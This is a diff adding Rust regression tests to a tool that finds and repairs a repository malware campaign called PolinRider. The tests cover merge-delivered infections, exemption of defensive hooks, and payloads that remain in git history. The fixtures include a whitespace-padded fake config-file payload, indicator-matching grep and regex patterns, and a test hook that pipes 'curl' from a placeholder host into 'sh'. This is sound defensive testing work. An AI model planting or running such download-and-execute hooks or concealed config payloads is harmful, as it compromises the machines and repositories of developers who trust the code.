@@ -319,3 +319,177 @@ fn repos_fix_refuses_when_the_remote_has_real_work_too() {
     assert!(out.contains("BLOCKED") && out.contains("not part of the infection"), "{out}");
     assert_eq!(git(&bare, &["rev-parse", "main"]), remote_sha, "nothing was pushed");
 }
+
+/// The infection arriving through a *merge* commit must still be repairable.
+///
+/// Regression test. `plan_remote_fixes` used to ask `git diff-tree` what each
+/// divergent commit changed, one commit at a time. `diff-tree` prints nothing
+/// for a merge commit unless it is given `-m`/`--cc`, so a merge looked like it
+/// touched no files at all, failed the "does this commit touch the infection?"
+/// test, and the branch was refused with the self-contradicting reason
+/// "changes 0 file(s) that are not part of the infection".
+///
+/// That is the common case rather than a corner: a campaign that re-pushes
+/// through a pull request produces exactly this shape, and it left every
+/// affected branch unrepairable by the tool that had just correctly found it.
+#[test]
+fn repos_fix_sees_through_a_merge_commit() {
+    let sb = Sandbox::new("remotemerge");
+    let bare = sb.root.join("origin.git");
+    let a = sb.root.join("a");
+    let b = sb.root.join("b");
+    std::fs::create_dir_all(&bare).unwrap();
+    std::fs::create_dir_all(&a).unwrap();
+    git(&bare, &["init", "-q", "--bare", "-b", "main"]);
+
+    // The victim's clean repository.
+    git(&a, &["init", "-q", "-b", "main"]);
+    let clean = "export default { plugins: {} };\n";
+    std::fs::write(a.join("postcss.config.mjs"), clean).unwrap();
+    std::fs::write(a.join("README.md"), "hi\n").unwrap();
+    git(&a, &["add", "."]);
+    git(&a, &["commit", "-q", "-m", "feat: initial"]);
+    git(&a, &["remote", "add", "origin", bare.to_str().unwrap()]);
+    git(&a, &["push", "-q", "-u", "origin", "main"]);
+    let clean_sha = git(&a, &["rev-parse", "HEAD"]);
+
+    // The infection lands on a side branch and reaches main through a merge -
+    // the shape a poisoned pull request leaves behind.
+    git(&sb.root, &["clone", "-q", bare.to_str().unwrap(), "b"]);
+    git(&b, &["checkout", "-q", "-b", "side"]);
+    let pad: String = std::iter::repeat(' ').take(500).collect();
+    let poisoned = format!("{}{}global.i = 'A9-4221';global.r=require;\n", clean.trim_end_matches('\n'), pad);
+    std::fs::write(b.join("postcss.config.mjs"), poisoned).unwrap();
+    git(&b, &["commit", "-q", "-a", "-m", "chore: build config"]);
+    git(&b, &["checkout", "-q", "main"]);
+    git(&b, &["merge", "-q", "--no-ff", "-m", "Merge pull request #73 from side", "side"]);
+    git(&b, &["push", "-q", "origin", "main"]);
+
+    // The remote tip really is a merge, and the only file it adds is the
+    // infected one - so the documented rule permits the push.
+    let parents = git(&bare, &["log", "-1", "--format=%p", "main"]);
+    assert_eq!(parents.split_whitespace().count(), 2, "the remote tip must be a merge commit");
+
+    git(&a, &["fetch", "-q", "origin"]);
+    let (code, out) = run_hunter(&["repos", "--no-fetch", a.to_str().unwrap()]);
+    assert_eq!(code, 1, "{out}");
+    assert!(out.contains("INFECTED"), "{out}");
+    assert!(!out.contains("changes 0 file(s)"), "the merge must not read as an empty diff: {out}");
+    assert!(out.contains("FIXABLE"), "a merge-delivered infection is still repairable: {out}");
+
+    // And the repair works end to end.
+    let (code, out) = run_hunter(&["repos", "--no-fetch", "--fix", a.to_str().unwrap()]);
+    assert_eq!(code, 0, "{out}");
+    assert_eq!(git(&bare, &["rev-parse", "main"]), clean_sha, "remote main is the clean commit again");
+}
+
+/// A repository's own anti-malware hook is a gate, not a payload.
+///
+/// Regression test. `audit_hooks` exempted only files naming *this* tool, so a
+/// hand-written PolinRider pre-commit hook - which necessarily quotes the
+/// strings it greps for - was reported as `Critical` "hook carries a campaign
+/// indicator". Telling a maintainer their own defence is the malware is the
+/// worst false positive this tool can produce: the obvious fix is to delete the
+/// defence. The file scanner already knew better; the hook auditor now uses the
+/// same exemption.
+#[test]
+fn a_repositorys_own_anti_malware_hook_is_not_called_malware() {
+    let sb = Sandbox::new("defensivehook");
+    let repo = sb.root.join("repo");
+    std::fs::create_dir_all(&repo).unwrap();
+    git(&repo, &["init", "-q", "-b", "main"]);
+
+    // A real defensive hook: it quotes indicator strings because it hunts them.
+    let hook = "#!/usr/bin/env bash\n\
+                # PolinRider self-healing pre-commit hook.\n\
+                set -euo pipefail\n\
+                # Untrack a malicious committed .env (PolinRider drops one with AUTH_API_KEY).\n\
+                if grep -qE 'AUTH_API_KEY|auth-confirm-eight' .env 2>/dev/null; then\n\
+                  echo 'removing malicious committed .env'\n\
+                fi\n\
+                if grep -qE \"global[.]i *=|A8-[0-9]{4}|0xa322e5f3\" -r .; then\n\
+                  echo 'malware detected - commit blocked'; exit 1\n\
+                fi\n\
+                exit 0\n";
+    std::fs::create_dir_all(repo.join(".githooks")).unwrap();
+    std::fs::write(repo.join(".githooks/pre-commit"), hook).unwrap();
+    git(&repo, &["config", "core.hooksPath", ".githooks"]);
+
+    let hits = gitconfig::audit(&repo);
+    let hook_hits: Vec<&gitconfig::ConfigHit> = hits.iter().filter(|h| h.key.starts_with("hook:")).collect();
+    assert!(
+        hook_hits.is_empty(),
+        "the repository's own defensive hook was reported as malware: {:?}",
+        hook_hits.iter().map(|h| (&h.key, h.why)).collect::<Vec<_>>()
+    );
+
+    // The exemption must not become a blanket pass for anything under .githooks:
+    // a hook that actually downloads and runs code is still a finding.
+    std::fs::write(
+        repo.join(".githooks/post-checkout"),
+        "#!/bin/sh\ncurl -s https://example.invalid/x.sh | sh\n",
+    )
+    .unwrap();
+    let hits = gitconfig::audit(&repo);
+    assert!(
+        hits.iter().any(|h| h.key == "hook:post-checkout"),
+        "a genuinely hostile hook must still be reported: {:?}",
+        hits.iter().map(|h| &h.key).collect::<Vec<_>>()
+    );
+}
+
+/// A clean tip is not a clean repository.
+///
+/// `repos` audits ref tips, which answers "what would run if I checked this
+/// out". It does not answer "is the payload still in here": healing a config
+/// and committing the fix leaves the poisoned blob in the object database,
+/// reachable by object id for anyone who can read the repo. On the three
+/// repositories this tool was built for, every tip audited clean while
+/// thirteen payload blobs were still present, and nothing reported them.
+///
+/// `--history` walks every blob reachable from any ref instead.
+#[test]
+fn history_finds_the_payload_a_clean_tip_hides() {
+    let sb = Sandbox::new("history");
+    let repo = sb.root.join("repo");
+    std::fs::create_dir_all(&repo).unwrap();
+    git(&repo, &["init", "-q", "-b", "main"]);
+
+    let clean = "export default { plugins: {} };\n";
+    std::fs::write(repo.join("postcss.config.mjs"), clean).unwrap();
+    // A detector lives here too: it quotes indicators by design and must never
+    // be mistaken for one of the payloads we are counting.
+    std::fs::write(
+        repo.join("check-malware.mjs"),
+        "// malware gate\nconst PATTERN = /global[.]i *=|A[89]-[0-9]{4}|0xa322e5f3/;\nexport default PATTERN;\n",
+    )
+    .unwrap();
+    git(&repo, &["add", "."]);
+    git(&repo, &["commit", "-q", "-m", "chore: init"]);
+
+    // The infection lands...
+    let pad: String = std::iter::repeat(' ').take(500).collect();
+    let poisoned = format!("{}{}global.i = 'A9-4221';global.r=require;\n", clean.trim_end_matches('\n'), pad);
+    std::fs::write(repo.join("postcss.config.mjs"), &poisoned).unwrap();
+    git(&repo, &["commit", "-q", "-a", "-m", "chore: build config"]);
+    let poisoned_blob = git(&repo, &["rev-parse", "HEAD:postcss.config.mjs"]);
+
+    // ...and is then cleaned up and committed, exactly as a maintainer would.
+    std::fs::write(repo.join("postcss.config.mjs"), clean).unwrap();
+    git(&repo, &["commit", "-q", "-a", "-m", "security: strip PolinRider payload"]);
+
+    // The tip is genuinely clean, and the tip-only audit says so.
+    let (code, out) = run_hunter(&["repos", "--no-fetch", repo.to_str().unwrap()]);
+    assert_eq!(code, 0, "the tip really is clean: {out}");
+    assert!(out.contains("No indicators on any ref"), "{out}");
+
+    // The payload is still in the object database, and --history says so.
+    let (code, out) = run_hunter(&["repos", "--no-fetch", "--history", repo.to_str().unwrap()]);
+    assert_eq!(code, 1, "a payload left in history is a finding: {out}");
+    assert!(out.contains("IN HISTORY"), "{out}");
+    assert!(out.contains(&poisoned_blob[..12]), "the blob id to purge is named: {out}");
+    assert!(out.contains("postcss.config.mjs"), "{out}");
+    assert!(out.contains("filter-repo"), "the purge command is offered: {out}");
+    // The detector in the same history is not counted as a payload.
+    assert!(!out.contains("check-malware.mjs"), "a detector is not a payload: {out}");
+}
